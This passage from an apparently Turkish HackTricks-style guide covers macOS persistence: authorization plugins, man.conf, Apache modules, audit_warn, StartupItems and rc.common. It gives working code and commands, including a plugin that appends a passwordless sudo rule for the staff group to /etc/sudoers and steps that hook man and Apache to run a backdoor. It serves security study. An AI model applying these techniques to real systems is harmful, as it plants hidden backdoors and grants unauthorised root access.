#### Açıklama ve Exploitation

Persistence sağlamak amacıyla bir kullanıcı login olduğunda çalıştırılacak bir authorization plugin oluşturabilirsiniz. Bu plugin'lerden birinin nasıl oluşturulacağı hakkında daha fazla bilgi için önceki writeup'lara bakın (ve dikkatli olun; kötü yazılmış bir plugin sizi sistemin dışında bırakabilir ve Mac'inizi recovery mode'dan temizlemeniz gerekebilir).<sup>[[29]](#references)[[30]](#references)</sup>
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Taşı** bundle'ı yükleneceği konuma:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Son olarak, bu **Plugin**'i yükleyecek **rule**'ı ekleyin:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
**`evaluate-mechanisms`**, authorization framework'e **authorization için harici bir mekanizma çağırması gerekeceğini** bildirir. Ayrıca **`privileged`**, bunun root tarafından çalıştırılmasını sağlar.

Şununla tetikleyin:
```bash
security authorize com.asdf.asdf
```
Ve ardından **staff grubunun sudo** erişimine sahip olması gerekir (onaylamak için `/etc/sudoers` dosyasını okuyun).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)<sup>[[31]](#references)</sup>

- Sandbox bypass için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak root olmanız ve kullanıcının man kullanması gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- **`/private/etc/man.conf`**
- Root gerekir
- **`/private/etc/man.conf`**: man her kullanıldığında

#### Açıklama & Exploit

**`/private/etc/man.conf`** config dosyası, man documentation dosyalarını açarken kullanılacak binary/script'i belirtir. Bu nedenle executable path'i değiştirilerek kullanıcı bazı documentation'ları okumak için man kullandığında bir backdoor çalıştırılabilir.<sup>[[31]](#references)</sup>

Örneğin **`/private/etc/man.conf`** içine şunu yazın:
```
MANPAGER /tmp/view
```
Ardından `/tmp/view` öğesini şu şekilde oluşturun:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)<sup>[[32]](#references)</sup>

- sandbox'u bypass etmek için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak root olmanız ve apache'nin çalışıyor olması gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Httpd entitlements içermez

#### Konum

- **`/etc/apache2/httpd.conf`**
- Root gerekir
- Tetikleyici: Apache2 başlatıldığında

#### Açıklama ve Exploit

Bir modülü yüklemek için `/etc/apache2/httpd.conf` dosyasında aşağıdakine benzer bir satır ekleyebilirsiniz:<sup>[[32]](#references)</sup>
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
Bu şekilde derlenmiş modülünüz Apache tarafından yüklenecektir. Tek yapmanız gereken, modülü **geçerli bir Apple sertifikasıyla imzalamak** veya sisteme **yeni bir güvenilir sertifika ekleyip** modülü bununla **imzalamaktır**.

Ardından, gerekirse sunucunun başlatılacağından emin olmak için şunu çalıştırabilirsiniz:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Dylb için kod örneği:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM audit framework

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)<sup>[[33]](#references)</sup>

- sandbox bypass için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak root olmanız, auditd'nin çalışıyor olması ve bir warning oluşturmanız gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- **`/etc/security/audit_warn`**
- Root gerekir
- **Tetikleyici**: auditd bir warning algıladığında

#### Açıklama ve Exploit

auditd bir warning algıladığında **`/etc/security/audit_warn`** script'i **çalıştırılır**. Bu nedenle payload'unuzu buraya ekleyebilirsiniz.<sup>[[33]](#references)</sup>
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
You could force a warning with `sudo audit -n`.

### Startup Items

> [!CAUTION] > **Bu kullanım artık deprecated olduğundan, bu dizinlerde hiçbir şey bulunmamalıdır.**

**StartupItem**, `/Library/StartupItems/` veya `/System/Library/StartupItems/` dizinlerinden birinin içinde bulunması gereken bir dizindir. Bu dizin oluşturulduktan sonra, iki belirli dosyayı içermelidir:

1. Bir **rc script**: Startup sırasında çalıştırılan bir shell script.
2. Özellikle `StartupParameters.plist` olarak adlandırılan ve çeşitli yapılandırma ayarlarını içeren bir **plist file**.

Startup sürecinin bunları tanıyıp kullanabilmesi için hem rc script'in hem de `StartupParameters.plist` dosyasının **StartupItem** dizininin içine doğru şekilde yerleştirildiğinden emin olun.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Bu bileşeni macOS'umda bulamıyorum; daha fazla bilgi için writeup'a bakın.

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)<sup>[[34]](#references)</sup>

Apple tarafından sunulan **emond**, yeterince geliştirilmemiş veya muhtemelen terk edilmiş gibi görünen, ancak hâlâ erişilebilir olan bir logging mekanizmasıdır. Bir Mac yöneticisi için özellikle yararlı olmasa da bu belirsiz servis, tehdit aktörleri için çoğu macOS yöneticisi tarafından muhtemelen fark edilmeyecek gizli bir persistence yöntemi olarak kullanılabilir.<sup>[[34]](#references)</sup>

Varlığından haberdar olanlar için **emond**'un kötü amaçlı kullanımını tespit etmek oldukça kolaydır. Sistemin bu servise ait LaunchDaemon'u, çalıştırılacak script'leri tek bir dizinde arar. Bunu incelemek için aşağıdaki komut kullanılabilir:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

#### Konum

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- Root gerekir
- **Tetikleyici**: XQuartz ile

#### Açıklama ve Exploit

XQuartz artık **macOS'ta kurulu olarak gelmiyor**, bu nedenle daha fazla bilgi istiyorsanız writeup'a bakın.<sup>[[3]](#references)</sup>

### ~~kext~~

> [!CAUTION]
> Root olarak bile kext kurmak o kadar karmaşık ki, bir exploit'iniz olmadığı sürece bunu sandbox'lardan kaçmak veya persistence için değerlendirmeyeceğim.

#### Konum

Bir KEXT'i startup item olarak kurmak için **aşağıdaki konumlardan birine kurulması gerekir**:

- `/System/Library/Extensions`
- OS X işletim sistemine yerleşik KEXT dosyaları.
- `/Library/Extensions`
- 3rd party software tarafından kurulan KEXT dosyaları

Şu anda yüklenmiş kext dosyalarını şu komutla listeleyebilirsiniz:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Daha fazla bilgi için [**kernel extensions check this section**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)<sup>[[35]](#references)</sup>

#### Konum

- **`/usr/local/bin/amstoold`**
- Root gerekli

#### Açıklama ve Exploitation

Görünüşe göre `/System/Library/LaunchAgents/com.apple.amstoold.plist` içindeki `plist`, bir XPC service sunarken bu binary'yi kullanıyordu... Sorun, binary'nin mevcut olmamasıydı; dolayısıyla oraya bir şey yerleştirebilir ve XPC service çağrıldığında binary'nizin çalıştırılmasını sağlayabilirdiniz.<sup>[[35]](#references)</sup>

Bunu artık macOS'umda bulamıyorum.

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)<sup>[[36]](#references)</sup>

#### Konum

- **`/Library/Preferences/Xsan/.xsanrc`**
- Root gerekli
- **Tetikleyici**: Service çalıştırıldığında (nadiren)

#### Açıklama ve exploit

Görünüşe göre bu script'i çalıştırmak pek yaygın değil ve macOS'umda bunu bile bulamadım; daha fazla bilgi istiyorsanız writeup'a göz atın.<sup>[[36]](#references)</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **Bu, modern MacOS sürümlerinde çalışmıyor**

Buraya **startup sırasında çalıştırılacak komutlar** yerleştirmek de mümkündür. Örnek bir rc.common script'i:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Persistence teknikleri ve araçları

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## Referanslar

- [1] [2025, Infostealer yılı](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [Eski güzel LaunchAgents'ın ötesi - 1 - shell başlangıç dosyaları](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [Eski güzel LaunchAgents'ın ötesi - 18 - X11 ve XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [Eski güzel LaunchAgents'ın ötesi - 21 - Yeniden açılan uygulamalar](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [Eski güzel LaunchAgents'ın ötesi - 20 - Terminal tercihleri](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [Eski güzel LaunchAgents'ın ötesi - 13 - Audio Plugin'leri](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Audio Unit Plug-in'leri (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [Eski güzel LaunchAgents'ın ötesi - 12 - QuickLook Plugin'leri](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [Eski güzel LaunchAgents'ın ötesi - 22 - LoginHook ve LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [Eski güzel LaunchAgents'ın ötesi - 4 - cron job'ları](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [Eski güzel LaunchAgents'ın ötesi - 2 - iTerm2 başlangıcı](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [Eski güzel LaunchAgents'ın ötesi - 7 - xbar plugin'leri](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [Eski güzel LaunchAgents'ın ötesi - 8 - Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [Eski güzel LaunchAgents'ın ötesi - 6 - SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [Eski güzel LaunchAgents'ın ötesi - 3 - Login Items](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [Eski güzel LaunchAgents'ın ötesi - 14 - atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [Eski güzel LaunchAgents'ın ötesi - 24 - Klasör eylemleri](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [macOS'ta Persistence için Klasör Eylemleri (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [Eski güzel LaunchAgents'ın ötesi - 27 - Dock kısayolları](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [Eski güzel LaunchAgents'ın ötesi - 17 - Renk seçiciler](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [Eski güzel LaunchAgents'ın ötesi - 26 - Finder Sync Plugin'leri](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] [“Mac File Opener” Persistence'ını analiz etme (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
- [23] [Eski güzel LaunchAgents'ın ötesi - 16 - Ekran koruyucu](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [Erişiminizi koruma: macOS Persistence için ekran koruyucular (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [Eski güzel LaunchAgents'ın ötesi - 11 - Spotlight Importer'ları](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [Eski güzel LaunchAgents'ın ötesi - 9 - Preference Pane](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [Eski güzel LaunchAgents'ın ötesi - 19 - Periyodik script'ler](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [Eski güzel LaunchAgents'ın ötesi - 5 - Pluggable Authentication Module'leri (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [Eski güzel LaunchAgents'ın ötesi - 28 - Authorization Plugin'leri](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [Authorization Plugin'leri ile kalıcı kimlik bilgisi hırsızlığı (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [Eski güzel LaunchAgents'ın ötesi - 30 - man yapılandırma dosyası - man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [Eski güzel LaunchAgents'ın ötesi - 25 - Apache2 modülleri](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [Eski güzel LaunchAgents'ın ötesi - 31 - BSM audit framework'ü](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [Eski güzel LaunchAgents'ın ötesi - 23 - emond, Event Monitor Daemon](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [Eski güzel LaunchAgents'ın ötesi - 29 - amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [Eski güzel LaunchAgents'ın ötesi - 15 - xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)

{{#include ../banners/hacktricks-training.md}}
